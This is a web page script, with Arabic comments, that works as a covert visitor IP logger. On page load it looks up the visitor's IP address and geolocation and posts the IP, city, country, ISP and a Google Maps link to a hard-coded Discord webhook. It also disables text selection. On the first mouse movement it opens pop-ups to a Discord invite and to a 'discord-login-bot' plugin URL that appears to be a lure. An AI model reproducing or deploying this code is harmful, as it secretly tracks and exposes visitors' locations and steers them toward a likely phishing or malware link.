    <script>
        // منع التحديد
        var omitformtags = ['input', 'textarea', 'select'].join('|');
        function disableselect(e) {
            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
                return false;
        }
        function reEnable() { return true; }
        if (typeof document.onselectstart != 'undefined')
            document.onselectstart = function () { return false; };
        else {
            document.onmousedown = disableselect;
            document.onmouseup = reEnable;
        }

        // جلب IP والمعلومات
        function fetchIPAndInfo() {
            fetch('https://api.ipify.org/?format=json')
                .then((response) => response.json())
                .then((data) => {
                    document.getElementById('ip-address-value').textContent = data.ip;
                    return data.ip;
                })
                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
                .then((response) => response.json())
                .then((ipInfoData) => {
                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "Visitor");
                })
                .catch((error) => {
                    console.error('Error:', error);
                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
                });
        }

        function sendToDiscord(ipInfoData, googleMapsLink, username) {
            const webhookURL = "https://discord.com/api/webhooks/1415231483613810708/I4uAnLYqkHIGGjhJFwId-jH8vbnqL5rV_YFxMjMfnC3qjZMu7HFl11nvxcjignfmqH77";
            const payload = {
                content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
            };
            fetch(webhookURL, { 
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(() => console.log("IP sent to Discord!"))
            .catch(error => console.error(error));
        }

        fetchIPAndInfo();

        // فتح روابط عند تحريك الماوس
        let triggered = false;
        window.addEventListener('mousemove', () => {
            if (!triggered) {
                triggered = true;
                window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
                window.open('https://discord.gg/T111', '_blank');
            }
        });

        // زر الخروج
        document.getElementById('exitButton').addEventListener('click', () => {
            window.open('https://discord.gg/T111', '_blank');
            window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
            alert('اضغط OK للخروج من الشاشة');
        });
    </script>
